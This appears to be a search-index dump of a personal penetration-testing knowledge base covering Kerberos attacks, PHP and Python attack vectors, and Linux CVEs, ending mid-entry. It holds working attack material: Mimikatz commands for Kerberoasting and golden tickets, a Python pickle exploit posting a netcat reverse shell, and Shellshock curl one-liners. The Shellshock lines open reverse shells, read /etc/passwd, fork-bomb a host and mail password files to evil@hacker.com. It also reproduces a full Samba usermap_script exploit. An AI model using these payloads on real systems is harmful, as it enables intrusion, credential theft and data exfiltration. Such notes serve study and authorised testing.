Tickets &amp; RAM Injection"},{"location":"iam-kerberos/#defense","text":"Use *- ADServiceAccount cmdlet to create service accounts Pick really random, good passwords (25+ chars ) Monitor DC for bursts of Service Ticket requests (Event ID 4769) Force services to verify PAC - Doesn't prevent cracking - Prevent writing - Can impact performance","title":"Defense"},{"location":"iam-kerberos/#pass-the-key","text":"","title":"Pass the key"},{"location":"iam-kerberos/#pass-the-ticket","text":"The process of forging a session key and presenting that forgery to the resource as credentials","title":"Pass the ticket"},{"location":"iam-kerberos/#silver-ticket","text":"Silver Ticket: A forged ticket that grants access to a serviceCredential stuffing. Password hashes of service accounts could be used to create Kerberos session ticket (TGS) has a sever portion which is encrypted with the password hash of the service account. Can request a ticket and do offline brute forcing. https://drive.google.com/open?id=1iSXKVgkO_U61MCf0ItaZgyMt-406pWdD KDC does not handle authorization Can request TGS for any service TGS is encrypted using target-service NTLM hash .:. it is possible to brute-force the TGS to get target-service account credentials Find Service Accounts GetUserSPNs - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py PowerView (SPN = Service Principal Name) Get-Netuser -SPN ActiveDirectory Module Install-ActiveDirectoryModule -DllPath C : \\ AdModule \\ Microsoft . ActiveDirectory . Management . dll ADModulePath C : \\ AdModule \\ ActiveDirectory . psd1 Get-ADUser -Filter { ServicePrincipalName -ne $null } -Properties ServicePrincipalName Request SPN Ticket Add-Type -AssemblyName System . IdentityModel New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList server-name - PowerView Request-SPNTicket Save Tieket List all tickets in cache (check if granted): klist Mimikatz: Invoke - Mimikatz - Command kerberos::list /export Bruteforce tgsrepcrack or use John python . exe . \\ tgsrepcrack . py . \\ password . txt ticket","title":"Silver Ticket"},{"location":"iam-kerberos/#golden-ticket","text":"Golden Ticket: A ticket that grants a user domain admin access Ticket not made by KDC (ticket is self-made) Not limited by GPO Smart-card independent Hence, it's possible to push anything Since we have krbtgt Can modify PAC Group ID, SID, Username Kerberos is stateless All account policy is client side enforcement Disabled / Expiry / Logon hours Silo memberships Protected Users and other group memberships With Kerberos 5 - TGS / KDC has no way of validating that account is still valid when presented with TGT. Microsoft implement: If TGT is older than 20 mins the TGS will validate the account with KDC when issuing a service ticket. Account validity and check enabled state is checked. However, with Golden Ticket we issuer our own TGT. Therefore, it is possible to issue TGT with recent issued-times to bypass this check. Why attack on TGT, but not on TGS? Service account passwords are rotated every 30-40 days. Krbtgt account password is never changed. A singled TGT can get many TGS. Ticket Encryption PAC KDC Signature PAC Server Signature TGT krbtgt krbtgt krbtgt TGS target krbtgt target Generating \"Golden Ticket\" requires: KDC key (krbtgt) SID of the domain (whom, psgetsid) Domain name lsadump :: lsa / inject / name : krbtgt kerberos :: golden / domain : domain / sid : domain - sid / rc4 : ntlm - hash - of - krbtgt / user : Administrator / id : 500 - RID of the user ( 500 is domain admin ) / groups : 513 , 512 , 520 , 518 , 519 / ticket : Administrator.kirbi - ticket filename","title":"Golden Ticket"},{"location":"iam-kerberos/#encryption-downgrade-with-skeleton-key-malware","text":"A malware that can bypass Kerberos, but the attack must have Admin access","title":"Encryption downgrade with Skeleton Key Malware"},{"location":"iam-kerberos/#dcshadow-attack","text":"A new attack where attackers gain enough access inside a network to set up their own DC to use in further infiltration","title":"DCShadow attack"},{"location":"iam-kerberos/#smart-card-authentication-with-dh-keys","text":"If certificate based authentication is required DH must be implemented (as per spec) RFC 4556 RFC 5349 Microsoft improved current protocol with draft: https://tools.ietf.org/html/draft-ietf-kitten-pkinit-freshness-07 https://datatracker.ietf.org/meeting/91/session/kitten https://datatracker.ietf.org/meeting/91/materials/slides-91-kitten-1.pdf In order for GPO to work full network should be aware of it ( Windows 10 2016) Detect using IPS rule to inspect AS - RE Q ( AS - REQ is now signed, not encrypted)","title":"Smart Card Authentication with DH Keys"},{"location":"iam-kerberos/#attacking-windows-pki","text":"Mimikatz can export Windows CA (NTAuth certificate store ) Ask PKI server to generate a raw certificate (with any required expiry and any required user) without CRLDP so that cert cannot be revoked.","title":"Attacking Windows PKI"},{"location":"iam-kerberos/#kerberos-delegation","text":"Allows reusing the end-user credentials to access resources hosted on a different server. Used when Kerberos Double Hop is required. Impersonating the incoming/authentication user is necessary to work. Types: Unconstrained (only Windows Server 2003 ) - Allow authentication to any service in the domain Constrained","title":"Kerberos Delegation"},{"location":"iam-kerberos/#unconstrained-kerberos-delegation","text":"- https://drive.google.com/open?id=1VZvQcin4RN7PkByplk-LhI1P3mrCoJXY User provide credentials to DC DC returns TGT User request TGS for web service DC provides TGS (TGS contains user's TGT) User sends TGT and TGS to web Server Web server service account use user's TGT to request a TGS got database server from DC - Web server service account can decrypt TGS and extract the user's TGT - This is because TGS is encryoted with web server service account's NTLM hash Web server service account connects to database impersonating the user Identifying Nodes with Unconstrained Delegation Enabled Get - NetComputer - UnConstrained Get - ADComputer - Filter { TrustedForDelegation - eq $ True } Get - ADUser - Filter { TrustedForDelegation - eq $ True } Attack Pattern Compromise the server that use unconstrained delegation Wait for a high privileged connect Once connected, export all the tickets including TGT for that User Invoke - Mimikatz - Command sekurlsa::tickets /export Reuse tickets with Invoke - Mimikatz - Command kerberos::ppt C:\\tickets\\admin.kirbi","title":"Unconstrained Kerberos Delegation"},{"location":"iam-kerberos/#constrained-kerberos-delegation","text":"Only provide access to specified services on a specifiv computer Service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute Service account can asccess all services specified in msDS-AllowedToDelegateTo attribute Identifying Users with Unconstrained Delegation Enabled Get - DomainUser - TrustedToAuth Get - DomainComputer - TrustedToAuth Install - ActiveDirectoryModule - DllPath C : \\ AdModule \\ Microsoft . ActiveDirectory . Management . dll ADModulePath C : \\ AdModule \\ ActiveDirectory . psd1 Get - ADObject - Filter { msDS - AllowedToDelegateTo - ne $null } - Properties msDS - AllowedToDelegateTo - Attack Patterns Protocol Transition used in SSO Delegation occurs not only for the specific service but for any service running under the same account. No validation for the SPN specified. https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/","title":"Constrained Kerberos Delegation"},{"location":"iam-kerberos/#references","text":"https://docs.microsoft.com/en-us/windows/desktop/secauthn/authentication-portal https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos https://drive.google.com/open?id=1eaQki6QuqfbHqMfkaKH66z2OAnI0lV0H Tim Medin - Attacking Kerberos: Kicking the Guard Dog of Hades","title":"References"},{"location":"iam-kerberos/#new-references","text":"Attacking Microsoft Kerberos Kicking the Guard Dog of Hades Tim Medin https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/ https://www.tarlogic.com/en/blog/how-kerberos-works/ https://www.tarlogic.com/en/blog/how-to-attack-kerberos/","title":"New References"},{"location":"iam/","text":"IAM Kerberos Moved to dedicated section at https://kbase.ayoma.me/iam-kerberos/ JWT References Stop using JWT for sessions: http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/ No Way, JOSE! Javascript Object Signing and Encryption is a Bad Standard That Everyone Should Avoid: https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid OAuth2 Bug Reports Twitter: Insufficient OAuth callback validation which leads to Periscope account takeover: https://hackerone.com/reports/110293","title":"IAM"},{"location":"iam/#iam","text":"","title":"IAM"},{"location":"iam/#kerberos","text":"Moved to dedicated section at https://kbase.ayoma.me/iam-kerberos/","title":"Kerberos"},{"location":"iam/#jwt","text":"References Stop using JWT for sessions: http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/ No Way, JOSE! Javascript Object Signing and Encryption is a Bad Standard That Everyone Should Avoid: https://paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standard-that-everyone-should-avoid","title":"JWT"},{"location":"iam/#oauth2","text":"Bug Reports Twitter: Insufficient OAuth callback validation which leads to Periscope account takeover: https://hackerone.com/reports/110293","title":"OAuth2"},{"location":"languages/","text":"Esoteric Languages Malbolge compiler: https://www.tutorialspoint.com/execute_malbolge_online.php Brainfuck Interpreter: https://sange.fi/esoteric/brainfuck/impl/interp/i.html Piet Interpreter: https://www.bertnase.de/npiet/npiet-execute.php GO Environment Setup Preparing Your Environment For Go Development: https://www.gopherguides.com/courses/preparing-your-environment-for-go-development?utm_source=twitter utm_campaign=install utm_medium=twitter References https://github.com/parsiya/Hacking-with-Go https://www.blackhat.com/docs/asia-17/materials/asia-17-Clapis-Go-Get-My-Vulnerabilities-An-In-Depth-Analysis-Of-Go-Language-Runtime-And-The-New-Class-Of-Vulnerabilities-It-Introduces.pdf Java References LLJVM - running comparatively low level languages (such as C) on the JVM: https://github.com/davidar/lljvm Java deserialization attacks: Java-Deserialization-Cheat-Sheet https://github.com/NickstaDB/SerializationDumper https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/ https://github.com/NickstaDB/DeserLab https://github.com/NickstaDB/BaRMIe JavaScript Tools CharCode Translator: http://jdstiles.com/java/cct.html img src= x/ script eval(String.fromCharCode(CHARCODE_HERE)); /script NodeJS Tools Serialize an object including it's function into a JSON Contents for Node.Js Security Course References Exploiting deserialization bugs in Node.js modules for Remote Code Execution Exploiting Node.js deserialization bug for Remote Code Execution Node.js Security: Pentesting and Exploitation \u2013 NJS https://github.com/ajinabraham/Node.Js-Security-Course https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/node.js-deserialization.md https://www.vulnhub.com/entry/moonraker-1,264/ Node.Js Deserialization Attack \u2013 Detailed Tutorial 2018 Rails Rails' Remote Code Execution Vulnerability Explained RegEx References Regex tutorial\u200a\u2014\u200aA quick cheatsheet by examples: https://medium.com/factory-mind/regex-tutorial-a-simple-cheatsheet-by-examples-649dc1c3f285 Exploiting Regular Expressions: https://medium.com/@somdevsangwan/exploiting-regular-expressions-2192dbbd6936 Rust References Fearless Concurrency with Rust: https://blog.rust-lang.org/2015/04/10/Fearless-Concurrency.html Python Challenges https://www.hackingnote.com/en/python-challenge-solutions/level-5 Attack Vectors - Exploiting Imports - It is possible to create a .py file named with the name of the import. This will load the local file (same dir as the file importing the library) instead of the actual library. - cPickle RCE - Arbitrary code execution with Python pickles - Python Pickle Injection - https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/ - https://blog.nelhage.com/2011/03/exploiting-pickle/ - https://stackoverflow.com/questions/38307636/can-anyone-explain-me-the-example-of-an-exploit-in-python-s-pickle-module - HTB - DevOps - HTB - Challenge - Mics - Long Bottom's Locker - https://www.hackingnote.com/en/python-challenge-solutions/level-5 #!/usr/bin/python3 import sys import pickle f = open ( sys . argv [ 1 ], rb ) mydict = pickle . load ( f ) f . close for line in mydict : print ( . join ([ k * v for k , v in line ])) for i in mydict : b = [] for x in i : #print x b . append ( x [ 0 ] * x [ 1 ]) print ( . join ( b )) import cPickle , requests , base64 LHOST = 10.10.14.14 LPORT = 31337 RHOST = 10.10.10.91 RPORT = 5000 class Payload ( object ): def __init__ ( self , cmd ): self . cmd = cmd def __reduce__ ( self ): import os return ( os . system , ( self . cmd ,)) reverse_sh = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc %s %s /tmp/f % ( LHOST , LPORT ) evilpickle = cPickle . dumps ( Payload ( reverse_sh )) r = requests . post ( http:// %s : %s /newpost % ( RHOST , RPORT ), data = base64 . urlsafe_b64encode ( evilpickle )) print ( POST {} {} . format ( r . status_code , r . url )) PHP Cheatsheets https://www.logicbig.com/tutorials/misc/php/php-advance-cheat-sheet.html http://overapi.com/php https://courses.cs.washington.edu/courses/cse154/18au/resources/cheatsheets/php-cheatsheet.pdf References Understanding PHP Object Injection https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/ https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/ http://pentestmonkey.net/tools/web-shells/php-reverse-shell PHP Remote File Inclusion command shell using data:// Hardening and securing PHP on Linux HTTP Parameter Pollution with cookies in PHP Attack Vectors Terminate strings using null byte** Before PHP 5 . 3 terminate strings using null byte is possible (%00 in URL) http : // example . com ? param = .. / .. / .. / .. / etc / passed - / etc / passed . php http : // example . com ? param = .. / .. / .. / .. / etc / passed % 00 - / etc / passed Vulnerable Functions Local / Remote file inclusion bugs: include() include_once() require() require_once() Local / Remote command execution bugs: eval() preg_replace() fwrite() passthru() file_get_contents() shell_exec() system() SQL Injection bugs: mysql_query() File / File system bugs: fopen() readfile() glob() file() popen() exec() https://0xzoidberg.wordpress.com/2010/05/26/vulnerable-php-functions/ RCE with PREG Functions implement regular expressions for the preg_ functions (preg_match, preg_replace) / e modifier which allows evaluation of PHP code in the preg_replace Example: ?php $string = this is my lower sting ; print preg_replace ( /(.*)/e , strtoupper( \\\\1 ) , $string ); ? // THIS IS MY LOWER STING Example Attack: ?php $string = phpinfo() ; print preg_replace ( /^(.*)/e , strtoupper(\\\\1) , $string ); ? Filter Evasion: - Prevent single quote and escape chars Following will fail: $string = system( ls -lah ) ; Bypass: $string = `ls -lah` ; Ref: http://www.madirish.net/402 LFI with Filter Inclusion Useful when LFI is possible but \".php\" is appended at end (and not vulnerable to null byte injection) filter / convert . base64 - encode forces PHP to base64 encode the file before it is used in the require statement ( index \u200b . php ) http://example.com/?page=php://filter/convert.base64-encode/resource=index\u200b LFI with Zip Inclusion (Include a file inside a zip) If it is possible to upload a zip file http://example.com/?page=zip://uploads/zipfilename#shell.php?cmd=id LFI to RFI Possible if allow_url_include is on Type Juggling References: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/ https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/ 0e1234 == 0e4321 0e1234 == 0 0e1234 = 1 0xf == 15 #0xf in hexadecimal notation is 15 000...000 == int(0) 0e0...000 == int(0) 1e0...000 == int(1) 0abc...000 == int(0) abc...000 == int(0) # if a string starts with a non numerical character it will default to int(0) var_dump( 2 bottles == 2); // == TRUE $values = array( apple , orange , pear , grape ); in_array(0, $values); // == TRUE if($password == secretpass ) // == TRUE when $password=0 Example: php $token = 0e124656823434657657655654324342 ; if(isset($_COOKIE[ token ]) $_COOKIE[ token ] == $token) { // access to privilege area } else { // login require } ? $COOKIE[\u2018token\u2019] == $token (\u20180e124656823434657657655654324342\u2019 == \u20180\u2019) will return TRUE $COOKIE[\u2018token\u2019] != $token (\u20180e124656823434657657655654324342\u2019 != \u20180\u2019) will return FALSE Reduction in Entropy (Insecure HMAC) $secret = secure_random_secret_value ; $hmac = md5($secret . $_POST[ message ]); if($hmac == $_POST[ hmac ]) br // === Bypass by creating a hmac starting with `0e[0-9]` // var_dump( 0e123 == 0e51217526859264863 ); === TRUE shell_exec($_POST[ message ]); Hashing Algorithm Disclosure Given 240610708 and QNKCDZO attacker can guess that hashing algo is md5 var_dump(md5( 240610708 ) == md5( QNKCDZO )); === TRUE","title":"Languages"},{"location":"languages/#esoteric-languages","text":"Malbolge compiler: https://www.tutorialspoint.com/execute_malbolge_online.php Brainfuck Interpreter: https://sange.fi/esoteric/brainfuck/impl/interp/i.html Piet Interpreter: https://www.bertnase.de/npiet/npiet-execute.php","title":"Esoteric Languages"},{"location":"languages/#go","text":"Environment Setup Preparing Your Environment For Go Development: https://www.gopherguides.com/courses/preparing-your-environment-for-go-development?utm_source=twitter utm_campaign=install utm_medium=twitter References https://github.com/parsiya/Hacking-with-Go https://www.blackhat.com/docs/asia-17/materials/asia-17-Clapis-Go-Get-My-Vulnerabilities-An-In-Depth-Analysis-Of-Go-Language-Runtime-And-The-New-Class-Of-Vulnerabilities-It-Introduces.pdf","title":"GO"},{"location":"languages/#java","text":"References LLJVM - running comparatively low level languages (such as C) on the JVM: https://github.com/davidar/lljvm Java deserialization attacks: Java-Deserialization-Cheat-Sheet https://github.com/NickstaDB/SerializationDumper https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/ https://github.com/NickstaDB/DeserLab https://github.com/NickstaDB/BaRMIe","title":"Java"},{"location":"languages/#javascript","text":"Tools CharCode Translator: http://jdstiles.com/java/cct.html img src= x/ script eval(String.fromCharCode(CHARCODE_HERE)); /script","title":"JavaScript"},{"location":"languages/#nodejs","text":"Tools Serialize an object including it's function into a JSON Contents for Node.Js Security Course References Exploiting deserialization bugs in Node.js modules for Remote Code Execution Exploiting Node.js deserialization bug for Remote Code Execution Node.js Security: Pentesting and Exploitation \u2013 NJS https://github.com/ajinabraham/Node.Js-Security-Course https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/node.js-deserialization.md https://www.vulnhub.com/entry/moonraker-1,264/ Node.Js Deserialization Attack \u2013 Detailed Tutorial 2018","title":"NodeJS"},{"location":"languages/#rails","text":"Rails' Remote Code Execution Vulnerability Explained","title":"Rails"},{"location":"languages/#regex","text":"References Regex tutorial\u200a\u2014\u200aA quick cheatsheet by examples: https://medium.com/factory-mind/regex-tutorial-a-simple-cheatsheet-by-examples-649dc1c3f285 Exploiting Regular Expressions: https://medium.com/@somdevsangwan/exploiting-regular-expressions-2192dbbd6936","title":"RegEx"},{"location":"languages/#rust","text":"References Fearless Concurrency with Rust: https://blog.rust-lang.org/2015/04/10/Fearless-Concurrency.html","title":"Rust"},{"location":"languages/#python","text":"Challenges https://www.hackingnote.com/en/python-challenge-solutions/level-5 Attack Vectors - Exploiting Imports - It is possible to create a .py file named with the name of the import. This will load the local file (same dir as the file importing the library) instead of the actual library. - cPickle RCE - Arbitrary code execution with Python pickles - Python Pickle Injection - https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/ - https://blog.nelhage.com/2011/03/exploiting-pickle/ - https://stackoverflow.com/questions/38307636/can-anyone-explain-me-the-example-of-an-exploit-in-python-s-pickle-module - HTB - DevOps - HTB - Challenge - Mics - Long Bottom's Locker - https://www.hackingnote.com/en/python-challenge-solutions/level-5 #!/usr/bin/python3 import sys import pickle f = open ( sys . argv [ 1 ], rb ) mydict = pickle . load ( f ) f . close for line in mydict : print ( . join ([ k * v for k , v in line ])) for i in mydict : b = [] for x in i : #print x b . append ( x [ 0 ] * x [ 1 ]) print ( . join ( b )) import cPickle , requests , base64 LHOST = 10.10.14.14 LPORT = 31337 RHOST = 10.10.10.91 RPORT = 5000 class Payload ( object ): def __init__ ( self , cmd ): self . cmd = cmd def __reduce__ ( self ): import os return ( os . system , ( self . cmd ,)) reverse_sh = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc %s %s /tmp/f % ( LHOST , LPORT ) evilpickle = cPickle . dumps ( Payload ( reverse_sh )) r = requests . post ( http:// %s : %s /newpost % ( RHOST , RPORT ), data = base64 . urlsafe_b64encode ( evilpickle )) print ( POST {} {} . format ( r . status_code , r . url ))","title":"Python"},{"location":"languages/#php","text":"","title":"PHP"},{"location":"languages/#cheatsheets","text":"https://www.logicbig.com/tutorials/misc/php/php-advance-cheat-sheet.html http://overapi.com/php https://courses.cs.washington.edu/courses/cse154/18au/resources/cheatsheets/php-cheatsheet.pdf","title":"Cheatsheets"},{"location":"languages/#references","text":"Understanding PHP Object Injection https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/ https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/ http://pentestmonkey.net/tools/web-shells/php-reverse-shell PHP Remote File Inclusion command shell using data:// Hardening and securing PHP on Linux HTTP Parameter Pollution with cookies in PHP","title":"References"},{"location":"languages/#attack-vectors","text":"","title":"Attack Vectors"},{"location":"languages/#terminate-strings-using-null-byte","text":"Before PHP 5 . 3 terminate strings using null byte is possible (%00 in URL) http : // example . com ? param = .. / .. / .. / .. / etc / passed - / etc / passed . php http : // example . com ? param = .. / .. / .. / .. / etc / passed % 00 - / etc / passed","title":"Terminate strings using null byte**"},{"location":"languages/#vulnerable-functions","text":"Local / Remote file inclusion bugs: include() include_once() require() require_once() Local / Remote command execution bugs: eval() preg_replace() fwrite() passthru() file_get_contents() shell_exec() system() SQL Injection bugs: mysql_query() File / File system bugs: fopen() readfile() glob() file() popen() exec() https://0xzoidberg.wordpress.com/2010/05/26/vulnerable-php-functions/","title":"Vulnerable Functions"},{"location":"languages/#rce-with-preg-functions","text":"implement regular expressions for the preg_ functions (preg_match, preg_replace) / e modifier which allows evaluation of PHP code in the preg_replace Example: ?php $string = this is my lower sting ; print preg_replace ( /(.*)/e , strtoupper( \\\\1 ) , $string ); ? // THIS IS MY LOWER STING Example Attack: ?php $string = phpinfo() ; print preg_replace ( /^(.*)/e , strtoupper(\\\\1) , $string ); ? Filter Evasion: - Prevent single quote and escape chars Following will fail: $string = system( ls -lah ) ; Bypass: $string = `ls -lah` ; Ref: http://www.madirish.net/402","title":"RCE with PREG Functions"},{"location":"languages/#lfi-with-filter-inclusion","text":"Useful when LFI is possible but \".php\" is appended at end (and not vulnerable to null byte injection) filter / convert . base64 - encode forces PHP to base64 encode the file before it is used in the require statement ( index \u200b . php ) http://example.com/?page=php://filter/convert.base64-encode/resource=index\u200b","title":"LFI with Filter Inclusion"},{"location":"languages/#lfi-with-zip-inclusion-include-a-file-inside-a-zip","text":"If it is possible to upload a zip file http://example.com/?page=zip://uploads/zipfilename#shell.php?cmd=id","title":"LFI with Zip Inclusion (Include a file inside a zip)"},{"location":"languages/#lfi-to-rfi","text":"Possible if allow_url_include is on","title":"LFI to RFI"},{"location":"languages/#type-juggling","text":"References: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/ https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/ 0e1234 == 0e4321 0e1234 == 0 0e1234 = 1 0xf == 15 #0xf in hexadecimal notation is 15 000...000 == int(0) 0e0...000 == int(0) 1e0...000 == int(1) 0abc...000 == int(0) abc...000 == int(0) # if a string starts with a non numerical character it will default to int(0) var_dump( 2 bottles == 2); // == TRUE $values = array( apple , orange , pear , grape ); in_array(0, $values); // == TRUE if($password == secretpass ) // == TRUE when $password=0 Example: php $token = 0e124656823434657657655654324342 ; if(isset($_COOKIE[ token ]) $_COOKIE[ token ] == $token) { // access to privilege area } else { // login require } ? $COOKIE[\u2018token\u2019] == $token (\u20180e124656823434657657655654324342\u2019 == \u20180\u2019) will return TRUE $COOKIE[\u2018token\u2019] != $token (\u20180e124656823434657657655654324342\u2019 != \u20180\u2019) will return FALSE","title":"Type Juggling"},{"location":"languages/#reduction-in-entropy-insecure-hmac","text":"$secret = secure_random_secret_value ; $hmac = md5($secret . $_POST[ message ]); if($hmac == $_POST[ hmac ]) br // === Bypass by creating a hmac starting with `0e[0-9]` // var_dump( 0e123 == 0e51217526859264863 ); === TRUE shell_exec($_POST[ message ]);","title":"Reduction in Entropy (Insecure HMAC)"},{"location":"languages/#hashing-algorithm-disclosure","text":"Given 240610708 and QNKCDZO attacker can guess that hashing algo is md5 var_dump(md5( 240610708 ) == md5( QNKCDZO )); === TRUE","title":"Hashing Algorithm Disclosure"},{"location":"linux-issues/","text":"Collections https://github.com/lucyoa/kernel-exploits Exploits CVE-2014-6271 - Shellshock Bash 4 . 3 and earlier Execute commands from environment variables unintentionally. Caused by Bash processing trailing strings after function definitions in the values of environment variables. Exploitable when attacker has control of environment variables. https://fedoramagazine.org/shellshock-how-does-it-actually-work/ GET http :// shellshock . testsparker . com / cgi-bin / netsparker . cgi HTTP / 1 . 1 User-Agent : Netsparker Host : shellshock . testsparker . com Referer : () { : ;} ; echo NS: $( / etc / passwd ) Test if Vulnerable env x = () { :;}; echo OOPS bash -c : env x = () { :;}; echo vulnerable bash -c echo not-vulnerable Explanation To run a command in a new shell bash -c ls New shell inherits environment If new shell finds what seems to be a function in an environment variable: New shell executes the function to get the actual value When function is executed, evaluation didn't stop when the end of the function definition is reached. Hence, when new shell sees () { :; } ; , bash will start executing the function and proceed to also execute the echo . Samples Passwd curl -A () { :;}; echo Content-Type: text/plain ; echo; /bin/cat /etc/passwd http://192.168.1.14/cgi-bin/status curl -H user-agent: () { :; }; echo; echo; /bin/bash -c cat /etc/passwd \\ http://192.168.1.14/cgi-bin/status Directory Listing curl -A () { :;}; echo Content-Type: text/plain ; echo; /bin/ls / http://192.168.1.14/cgi-bin/status Reverse shell curl -A () { :; }; /bin/bash -c /usr/bin/nc -lvvp 2345 -e /bin/bash http://192.168.1.14/cgi-bin/status curl -H User-Agent: () { :; }; /bin/bash -i /dev/tcp/10.10.14.203/1234 0 1 http://10.10.10.56/cgi-bin/user.sh Setuid shell: () { :; } ; cp / bin / bash / tmp / bash chmod 4755 / tmp / bash Fork Bomb: () { :; } ; :() { : | : } ;: Ping Bot: () { :; } ; ping - s 1000000 victim IP Data Theft: () { : ; } ; find ~ - print | mail - s Your files evil @hacker . com () { : ; } ; cat ~/ . secret / passwd | mail - s This password file evil @hacker . com Exploitation Vectors https://github.com/opsxcq/exploit-CVE-2014-6271 CGI Bash will receive the environment variables passed by the server Server passes various details of the request to a handler program in the environment variable list. For example, HTTP_USER_AGENT . exploit / multi / http / apache_mod_cgi_bash_env_exec Apache mod_cgi - 'Shellshock' Remote Command Injection OpenSSH ForceCommand will execute a fixed command on login If user specify a command to run, user specific command is put into environment ( SSH_ORIGINAL_COMMAND ) Bash will parse SSH_ORIGINAL_COMMAND on start-up, and run the commands DHCP clients Some DHCP clients can also pass commands to Bash Malicious DHCP server provide, a string crafted to execute code (in an addition option) Qmail server Qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash. IBM HMC restricted shell References Shellshock: How does it actually work? [Related Issues+] ShellShock: All you need to know about the Bash Bug vulnerability Practice https://pentesterlab.com/exercises/cve-2014-6271 [Docker] Shellshock exploit + vulnerable environment HTB - Shocker CVE-2014-7169 CVE-2014-0160 - Heartbleed Exploits https://github.com/sensepost/heartbleed-poc https://gist.github.com/eelsivart/10174134 References https://fedoramagazine.org/update-on-cve-2014-0160-aka-heartbleed/ CVE-2016-4971 - GNU Wget 1.18 - Arbitrary File Upload / Remote Code Execution issuing a crafted HTTP 30X Redirect containing FTP server reference in response wget will automatically follow the redirect wget will download a malicious file from the FTP server (to current dir) wget will fail to rename the file to the originally requested filename will not work with - O However, By saving .wgetrc in / home / victim / . wgetrc could set arbitrary wget settings such as destination directory Exploits https://www.exploit-db.com/exploits/40064 OpenSSH =6.6 SFTP misconfiguration Exploit https://github.com/SECFORCE/sftp-exploit References https://www.secforce.com/blog/2018/03/openssh_exploit_32_and_64_bit/ Practice HTB - Nightmare CVE-2007-2447 - (SMB) Samba 3.0.20 3.0.25rc3 Exploitable when using the non-default \"username map script\" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. Case study: https://amriunix.com/post/cve-2007-2447-samba-usermap-script/ exploit / multi / samba / usermap_script Exploits : https://github.com/amriunix/cve-2007-2447 #!/usr/bin/python # -*- coding: utf-8 -*- # From : https://github.com/amriunix/cve-2007-2447 # case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/ import sys from smb.SMBConnection import SMBConnection def exploit ( rhost , rport , lhost , lport ): payload = mkfifo /tmp/hago; nc + lhost + + lport + 0 /tmp/hago | /bin/sh /tmp/hago 2 1; rm /tmp/hago username = /=`nohup + payload + ` conn = SMBConnection ( username , , , ) try : conn . connect ( rhost , int ( rport ), timeout = 1 ) except : print [+] Payload was sent - check netcat ! if __name__ == __main__ : print ( [*] CVE-2007-2447 - Samba usermap script ) if len ( sys . argv ) != 5 : print ( [-] usage: python + sys . argv [ 0 ] + RHOST RPORT LHOST LPORT ) else : print ( [+] Connecting ! ) rhost = sys . argv [ 1 ] rport = sys . argv [ 2 ] lhost = sys . argv [ 3 ] lport = sys . argv [ 4 ] exploit ( rhost , rport , lhost , lport ) Privilege Escalation CVE-2010-0832 - Linux PAM 1.1.X MOTD File Tampering pam_motd (aka the MOTD module) in libpam-modules Before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10 Before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS Change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory. \"user file stamps\" and the motd . legal - notice file. Exploits https://www.exploit-db.com/exploits/14339 https://www.exploit-db.com/exploits/14273 https://twitter.com/jonoberheide/status/18009527979 Practice HTB - Popcorn CVE-2015-5602 - 'Sudoedit' Unauthorized Privilege Escalation RHEL /7 / Ubuntu Sudo = 1.8.14 When /etc/sudoers reads: user_to_grant_priv ALL = ( root ) NOPASSWD : sudoedit / home /*/*/test.txt Sudoedit does not check the full path if a wildcard is used twice (e.g. /home/ / /file.txt), Allowing a malicious user to replace the file.txt real file with a symbolic link to a different location (e.g. /etc/shadow). Example / home / user_to_grant_priv / newdir , test . txt pointing to / etc / shadow ln - sf / etc / shadow / home / user_to_grant_priv / newdir / test . txt Then do sudoedit / home / user_to_grant_priv / newdir / test . txt OR sudoedit - u user_to_grant_priv / home / user_to_grant_priv / newdir / test . txt https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh Usages Expose /etc/shadow Expose \u200bauthorized_keys over HTTP cd / var / www / testing / writeup ln - s / home / alekos / . ssh / authorized_keys layout . html References https://www.exploit-db.com/exploits/37710 Practice https://github.com/t0kx/privesc-CVE-2015-5602 HTB - Jocker CVE-2016-7545 - SELinux sandbox escape When executing a program via the SELinux sandbox The nonpriv session can escape 